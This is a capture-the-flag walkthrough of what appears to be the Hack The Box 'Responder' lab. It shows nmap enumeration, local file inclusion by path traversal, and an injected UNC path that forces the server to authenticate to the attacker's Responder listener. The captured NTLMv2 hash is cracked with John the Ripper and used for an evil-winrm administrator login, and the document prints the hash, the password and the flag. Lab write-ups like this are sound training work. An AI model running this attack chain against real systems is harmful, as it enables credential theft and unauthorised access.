---

---

# Responder
---
## Getting Started
---
Use command to set Target IP
```bash
IP='10.129.173.76' ; echo $IP
```

Use command to set Target IP
```bash
HIP="$(ifconfig tun0  | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')" ; echo $HIP

```


---
## Enumeration
---
### NMAP
---
Nmap Command Ran
```bash
nmap -sV -sC $IP | copy
```

Results
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 18:20 EDT
Nmap scan report for 10.129.173.76
Host is up (0.085s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.32 seconds

```
**Findings**
Port 80 is running web server Apache httpd 2.4.52 ((Win64)

### Website Enumeration 
After being rederected to unika.htb website tried to failed. Added unika.htb to /etc/hosts

Toggled to french and saw `http://unika.htb/index.php?page=french.html`
This seems to be calling for a file so we will if we can leverage File Inclusion Vulnerability

>Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET and POST parameters, cookies, and other variables. It is common for a page to "include" another page based on some of these parameters.
>
>**LFI** or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to afile as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to codeexecution as well.
>
>**RFI** or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.

>We test the page parameter to see if we can include files on the target system in the server response. We will test with some commonly known files that will have the same name across networks, Windows domains, and systems which can be found here. One of the most common files that a penetration tester might attempt to access on a Windows machine to verify LFI is the hosts file, `WINDOWS\System32\drivers\etc\hosts` (this file aids in the local translation of host names to IP addresses). The `../` string is used to traverse back a directory, one at a time. Thus multiple `../` strings are included in the URL so that the file handler on the server traverses back to the base directory i.e. `C:\`

Command
```bash
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

Result
```bash
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost
```

**Findings**
Returned the contents of the file requested The file inclusion, in this case, was made possible because in the backend the `include()` method of PHP is being used to process the URL parameter `page` for serving a different webpage for different languages.  And because no proper sanitation is being done on this `page` parameter, we were able to pass malicious input and therefore view the internal system files.

---
## Foothold
Use Responder to get the hash

Command
```bash
sudo python3 Responder.py -I tun0 

```

Then browse to `http://unika.htb/index.php?page=//10.10.15.180/somefile`

Result
```bash
[SMB] NTLMv2-SSP Client   : 10.129.173.76
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:afcc94341c2634f9:0798A1FB3556ACF9CBBCC7CA24CC8687:010100000000000080DE0052FED4D8014E934C3E38A2AF8A0000000002000800530052005000350001001E00570049004E002D004D00540044004600560035004F00300058004700540004003400570049004E002D004D00540044004600560035004F0030005800470054002E0053005200500035002E004C004F00430041004C000300140053005200500035002E004C004F00430041004C000500140053005200500035002E004C004F00430041004C000700080080DE0052FED4D801060004000200000008003000300000000000000001000000002000000F1592C539AD955B9C7A33D4A5634A126D3EE58B9D7C1DEADA99B8D049E031770A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100380030000000000000000000 
```

Create a hast.txt

Command
```bash
echo "Administrator::RESPONDER:afcc94341c2634f9:0798A1FB3556ACF9CBBCC7CA24CC8687:010100000000000080DE0052FED4D8014E934C3E38A2AF8A0000000002000800530052005000350001001E00570049004E002D004D00540044004600560035004F00300058004700540004003400570049004E002D004D00540044004600560035004F0030005800470054002E0053005200500035002E004C004F00430041004C000300140053005200500035002E004C004F00430041004C000500140053005200500035002E004C004F00430041004C000700080080DE0052FED4D801060004000200000008003000300000000000000001000000002000000F1592C539AD955B9C7A33D4A5634A126D3EE58B9D7C1DEADA99B8D049E031770A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100380030000000000000000000" > hash.txt 
```

Result
```bash
file with hash created
```

Crack using johntheripper


Command
```bash
john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt | copy
```

Result
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-09-30 19:01) 100.0g/s 614400p/s 614400c/s 614400C/s adriano..iheartyou
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Found USERNAME:Administrator and PASSWORD:badminton

Use evile-winrm because it allows you to use PowerShell from a windows box.

Command
```bash
evil-winrm -i $IP -u administrator -p badminton
```

Result
```Bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd C:\Users\mike
*Evil-WinRM* PS C:\Users\mike> ls


    Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop



*Evil-WinRM* PS C:\Users\mike> cd C:\Users\mike\Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> ls


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fa
```

---
## Flags
user.text
```bash
ea81b7afddd03efaa0945333ed147fa
```

---
## Tags
---
#jacktheripper #responder #evil-winrm #LocalFileInclusion #LFI